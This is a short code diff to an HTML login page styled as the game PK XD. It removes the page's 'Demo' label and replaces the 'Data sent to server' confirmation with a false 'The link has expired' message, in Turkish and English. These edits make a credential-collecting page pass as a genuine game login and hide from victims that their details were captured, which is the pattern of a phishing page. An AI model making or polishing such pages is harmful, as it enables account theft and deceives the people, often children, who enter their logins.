@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Login Demo - PK XD Stili</title>
+<title>PK XD Login</title>
 
 <style>
 *{
@@ -215,8 +215,8 @@ loginBtn.addEventListener("click", async ()=>{
 
   if(res.ok){
     result.textContent = currentLang === "tr"
-      ? "Veriler sunucuya gönderildi ✅"
-      : "Data sent to server ✅";
+      ? "Bağlantının Süresi Geçmiştir."
+      : "The link has expired.";
   }else{
     result.textContent = "Sunucu hatası ❌";
   }
@@ -227,3 +227,4 @@ updateLang();
 
 </body>
 </html>
+
